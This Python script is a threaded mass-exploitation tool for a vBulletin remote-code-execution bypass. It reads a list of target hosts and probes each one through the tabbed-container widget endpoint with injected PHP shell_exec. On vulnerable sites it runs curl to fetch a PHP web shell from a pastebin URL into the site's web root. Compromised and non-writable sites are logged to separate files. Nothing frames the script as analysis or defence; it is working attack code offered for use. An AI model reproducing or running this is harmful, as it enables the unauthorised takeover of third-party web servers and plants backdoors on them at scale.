import sys
import urllib3
import requests
from multiprocessing import Pool
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



headers = \
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Cookie': 'humans_21909=1'}

def banner():
    print("""
      ______       _ _      _   _        ______  _____  _____  ______                           
      | ___ \     | | |    | | (_)       | ___ \/  __ \|  ___| | ___ \                          
__   _| |_/ /_   _| | | ___| |_ _ _ __   | |_/ /| /  \/| |__   | |_/ /_   _ _ __   __ _ ___ ___ 
\ \ / / ___ \ | | | | |/ _ \ __| | '_ \  |    / | |    |  __|  | ___ \ | | | '_ \ / _` / __/ __|
 \ V /| |_/ / |_| | | |  __/ |_| | | | | | |\ \ | \__/\| |___  | |_/ / |_| | |_) | (_| \__ \__ \\
  \_/ \____/ \__,_|_|_|\___|\__|_|_| |_| \_| \_| \____/\____/  \____/ \__, | .__/ \__,_|___/___/
                                                                       __/ | |                  
                                                                      |___/|_|               
                 usage : python3 script.py list.txt threadcount   
""")


def shell_site(sites):
    try:
        data = {'subWidgets[0][template]' : 'widget_php',
        'subWidgets[0][config][code]' : "echo shell_exec('curl -o ./vbull_vuln.php https://pastebin.com/raw/uMqq8u5e'); exit;"}

        r = requests.post(f'{sites}ajax/render/widget_tabbedcontainer_tab_panel', data=data, headers=headers, timeout=10, verify=False)
        if r.ok:
            r1 = requests.get(f'{sites}vbull_vuln.php', headers=headers, timeout=10, verify=False)
            if 'VULN_TO_VBULLETIN_RCE_BYPASS' in r1.text:
                print(f'Shell upload success {sites}vbull_vuln.php')
                with open('vbull_vulnrce_cmdshell.txt', 'a+') as output:
                    output.write(f'Vulnerable : {sites}vbull_vuln.php\n')
            else:
                with open('vbull_vulnrce_notwritable.txt', 'a+') as output:
                    output.write(f'Vulnerable : {sites} (Not writable)\n')
                print(f'Website is vulnerable but the directory is not writable {sites}')
    except:
        pass

def check_vuln_rce_bypass(sites):
    try:
        data = {'subWidgets[0][template]' : 'widget_php',
        'subWidgets[0][config][code]' : "echo shell_exec('echo vuln_to_rce_bypass'); exit;"}
        r = requests.post(f'{sites}ajax/render/widget_tabbedcontainer_tab_panel', data=data, headers=headers, timeout=10, verify=False)
        
        if r.ok:
            if 'vuln_to_rce_bypass' in r.text:    
                shell_site(sites)
    except:
        pass


def main(url):
    try:
        r = requests.get(f'http://{url}/', headers=headers, timeout=10, verify=False)
        check_vuln_rce_bypass(r.url)
    except:
        pass


if __name__=='__main__':
    try:
        with open(str(sys.argv[1])) as lists:
            list_urls = lists.read().splitlines()
            p = Pool(int(sys.argv[2]))
            p.map(main, list_urls)
            p.terminate()
            p.join()
    except:
        banner()
